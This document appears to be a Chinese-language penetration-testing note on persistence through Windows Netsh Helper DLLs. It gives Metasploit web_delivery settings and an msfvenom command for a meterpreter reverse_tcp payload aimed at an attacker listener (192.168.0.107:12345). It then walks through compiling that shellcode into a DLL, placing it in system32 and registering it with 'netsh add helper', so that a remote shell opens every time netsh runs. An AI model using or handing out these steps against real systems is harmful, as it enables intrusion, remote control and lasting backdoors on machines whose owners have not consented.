  #### Netsh Helper DLL
	https://github.com/outflanknl/NetshHelperBeacon
	https://github.com/rtcrowley/Offensive-Netsh-Helper
  #### MSFvenom生成DLL
	生成DLL格式木马
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/501.png)

	传至靶机执行命令
	>netsh add helper C:\Windows\Temp\help.dll
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/502.png)
  #### MSF+web_delivery
	关闭netsh权限不会掉，调用的powershell
	>use exploit/multi/script/web_delivery
	>set target 2            #PSH
	>set payload windows/x64/meterpreter/reverse_tcp
	>set lhost 192.168.0.107
	>set lport 12345
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/503.png)

	Visual Studio新建空白DLL项目，源文件添加现有文件
	https://github.com/rtcrowley/Offensive-Netsh-Helper/blob/master/netshlep.cpp 
	复制生成的代码进文件中，配置管理器新建x64位数后生成解决方案，配置类型选择位动态库复制DLL到靶机执行
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/504.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/505.png)

	>netsh add helper helper.dll
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/506.png)
  #### MSF&Shellcode
	关闭netsh后权限会掉
	https://github.com/outflanknl/NetshHelperBeacon
	MSFvenom生成.c格式
	>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f c -o /var/www/html/1.c
	Visual Studio打开项目
	若系统是64位需设置配置管理器为64位项目，反之32(解决方案右键属性)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/507.png)

	将MSF生成shellcode粘贴进相应位置后生成解决方案。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/508.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/509.png)

	会在项目目录x64/Release下生成dll
	复制DLL到靶机system32目录下，执行命令
	>netsh add helper C:\Windows\System32\NetshHelperBeacon.dll
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/510.png)

	只要启动netsh就会触发
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/511.png)